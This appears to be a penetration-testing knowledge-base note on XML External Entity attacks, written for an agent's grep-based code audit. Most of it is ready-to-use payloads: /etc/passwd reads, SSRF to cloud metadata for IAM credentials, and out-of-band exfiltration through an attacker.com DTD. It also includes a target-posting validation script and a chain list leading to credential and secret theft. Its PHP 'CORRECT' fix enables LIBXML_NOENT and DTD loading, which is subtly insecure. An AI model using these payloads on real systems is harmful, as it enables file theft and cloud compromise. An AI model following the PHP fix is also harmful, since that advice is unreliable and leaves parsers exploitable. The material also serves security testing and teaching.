# XML External Entity (XXE)

**Tags:** #critical #xxe #xml #ssrf #lfi #exfiltration
**OWASP:** A05:2021 Security Misconfiguration
**CVSS Base:** 8.6 (High) — 9.8 (Critical — with OOB exfiltration or SSRF)

---

## 📖 What it is

XXE occurs when an XML parser accepts and processes **external entities** defined by the attacker in the submitted XML document. It can lead to local file reading, SSRF, and under certain conditions, RCE.

---

## 🔍 `grep_search` Tactics

```
DocumentBuilderFactory
SAXParserFactory
XMLReader
XMLInputFactory
XmlDocument
XmlReader
simplexml_load_string
simplexml_load_file
lxml.etree.parse
lxml.etree.fromstring
etree.parse
etree.fromstring
JAXB
XStream
libxml2
```

**What to check:** is `setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)` present?

**Absence** = critical vulnerability.

---

## 💣 Exploitation Payloads

### Basic — Local File Read
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>
```

### Windows
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]>
<root><data>&xxe;</data></root>
```

### SSRF via XXE (pivot to internal network)
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<root><data>&xxe;</data></root>
```

### Blind XXE — Out-of-Band via HTTP (OOB)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root><data>&send;</data></root>
```

**evil.dtd on the attacker's server:**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
```

### Blind XXE — Exfiltration via Parser Error
```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<root/>
```
The file contents appear in the error message (if debug is enabled).

### Blind XXE — OOB Exfiltration via DNS (Advanced)
```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://%file;.attacker.com/'>">
  %eval;
  %error;
]>
<root/>
```

### Advanced Blind XXE — OOB via Local DTD Repurposing
*Used when external network access is blocked. Exploits a local DTD file on the target server to redefine entities.*
```xml
<!DOCTYPE root [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
    <!ENTITY % expr 'some-expression'>
    <!ENTITY % constant 'ENTITY &#x25; file SYSTEM "file:///etc/passwd"'>
    %local_dtd;
]>
<root/>
```

### XInclude Attacks
*Used when DTD is disabled but XInclude is enabled in the parser (common in JAXP).*
```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</root>
```

### SOAP XXE Injection
*Targeting SOAP-based web services.*
```xml
<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope/">
  <soap:Header>
    <foo xmlns:xi="http://www.w3.org/2001/XInclude">
      <xi:include parse="text" href="file:///etc/passwd"/>
    </foo>
  </soap:Header>
  <soap:Body>...</soap:Body>
</soap:Envelope>
```

---

## 🎯 Content-Type Switching Attack

> REST apps that accept both `application/json` and `application/xml` may expose an unconfigured XML parser.

```bash
# Original JSON request
POST /api/data HTTP/1.1
Content-Type: application/json
{"name": "test"}

# XXE attempt  switch Content-Type
POST /api/data HTTP/1.1
Content-Type: application/xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data><name>&xxe;</name></data>
```

---

## 🧪 Validation Script

```python
# .tmp/validate_xxe.py
import requests

TARGET = "http://target.com"
ENDPOINT = "/api/upload"

# Basic detection payload
PAYLOAD = b"""<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data><value>&xxe;</value></data>"""

HEADERS = {
    "Content-Type": "application/xml"
}

try:
    r = requests.post(f"{TARGET}{ENDPOINT}", data=PAYLOAD, headers=HEADERS, timeout=10)
    if "root:" in r.text or "nobody:" in r.text:
        print("[CRITICAL XXE] Reading of /etc/passwd confirmed!")
        print(f"  Content: {r.text[:500]}")
    elif r.status_code == 200:
        print(f"[possibly blocked] Status: {r.status_code}")
        print(f"  Response: {r.text[:200]}")
    else:
        print(f"[blocked] Status: {r.status_code}")
except Exception as e:
    print(f"[error] {e}")
```

---

## 🛡️ Fix

### Java — Disable DTD/External Entities

```java
//  CORRECT  DocumentBuilderFactory
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
// Completely disable DOCTYPE
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
// Disable general external entities
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
// Disable external parameter entities (external DTD)
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
DocumentBuilder builder = dbf.newDocumentBuilder();
```

### Python — Secure lxml

```python
#  CORRECT  lxml with secure parser
from lxml import etree

# Parser that rejects external entities
parser = etree.XMLParser(
    resolve_entities=False,
    no_network=True,
    load_dtd=False
)
tree = etree.fromstring(xml_data, parser)
```

### PHP — simplexml with libxml

```php
//  CORRECT
libxml_disable_entity_loader(true);  // <= PHP 8.0, enabled by default since 8.0
$doc = simplexml_load_string($xml, 'SimpleXMLElement', LIBXML_NOENT | LIBXML_DTDLOAD);
// LIBXML_NOENT substitutes entities but is safe with libxml_disable_entity_loader active
```

### Modern JAXP Parser Bypass
If the developer only disabled some features but not `disallow-doctype-decl`, the parser may still process internal entities or some external fragments:
```java
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
// factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true); // MISSING!
```

---

## 🔗 Chain Exploits

```
XXE  /etc/passwd  System user enumeration
XXE  /etc/shadow  Password hashes  Offline brute force
XXE SSRF  http://169.254.169.254/  IAM credentials  AWS compromise
XXE OOB  .env exfiltration  Full application secrets
XXE  /proc/self/environ  Environment variables with DATABASE_URL
XXE + SAXParserFactory without configuration  Full schema exposed
```

---

## 📌 References
- [[ssrf-server-side-request-forgery]]
- [[path-traversal-lfi]]
- [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [PayloadsAllTheThings XXE](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)